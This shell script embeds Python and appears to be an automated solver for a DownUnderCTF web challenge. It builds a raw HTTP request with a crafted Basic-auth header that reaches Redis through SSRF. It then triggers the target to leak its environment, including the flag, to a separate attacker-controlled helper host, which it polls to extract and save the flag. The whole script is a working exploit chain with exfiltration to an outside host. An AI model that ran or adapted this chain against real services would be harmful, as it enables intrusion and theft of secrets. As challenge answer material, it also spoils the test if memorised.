#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import re
import socket
import time

import requests

BASE = "http://target:8119"
HELPER = "http://attacker-helper:8080"
BASIC_AUTH = "Basic L2hhY2tlci11c2VyOkhUVFAvMS4x"
SET_AUTH_REDIS = (
    "SET / HTTP/1.1\r\n"
    "Host: 127.0.0.1:1337\r\n"
    "Authorization: Basic bXI6ZmF0bW9ua2VAMTI3LjAuMC4xOjYzNzkvaGFja2VyLXVzZXIjCg==\r\n"
    "Content-Length: 0\r\n"
    "\r\n"
    "\r\n"
)
SESSION = requests.Session()
AUTH_HEADERS = {"Authorization": BASIC_AUTH}
EXPORT_PATH = "/var/www/off_dah_rails_m8/export_flag.json"
LEAK_PATH = "/var/www/off_dah_rails_m8/leak_flag.json"


def helper_reset() -> None:
    requests.post(HELPER + "/reset", timeout=10)


def helper_latest_env() -> str | None:
    resp = requests.get(HELPER + "/leak_env", timeout=10)
    return resp.json().get("env")


def wait_until_ready() -> None:
    deadline = time.time() + 120
    while time.time() < deadline:
        try:
            helper = requests.get(HELPER + "/healthz", timeout=5)
            target = requests.get(BASE, timeout=5)
            if helper.ok and target.status_code in (401, 403):
                return
        except requests.RequestException:
            time.sleep(1)
            continue
        time.sleep(1)
    raise SystemExit("services did not become ready")


def ssrf_redis() -> None:
    with socket.create_connection(("target", 8119), timeout=10) as sock:
        sock.sendall(SET_AUTH_REDIS.encode())
        sock.settimeout(1)
        try:
            sock.recv(1024)
        except Exception:
            pass


def trigger_flag_leak() -> str:
    helper_reset()
    for path in (EXPORT_PATH, LEAK_PATH):
        resp = SESSION.post(
            BASE,
            json={"config": path},
            headers=AUTH_HEADERS,
            timeout=15,
        )
        if resp.status_code not in (200, 400):
            raise SystemExit(f"unexpected status for {path}: {resp.status_code}")
        time.sleep(1)
    deadline = time.time() + 10
    while time.time() < deadline:
        leaked = helper_latest_env()
        if leaked:
            match = re.search(r"DUCTF\{[^}]+\}", leaked)
            if match:
                return match.group(0)
        time.sleep(0.5)
    raise SystemExit("failed to leak flag")


def main() -> None:
    wait_until_ready()
    ssrf_redis()
    flag = trigger_flag_leak()
    with open("/app/flags.txt", "w", encoding="utf-8") as f:
        f.write(flag + "\n")


if __name__ == "__main__":
    main()
PY
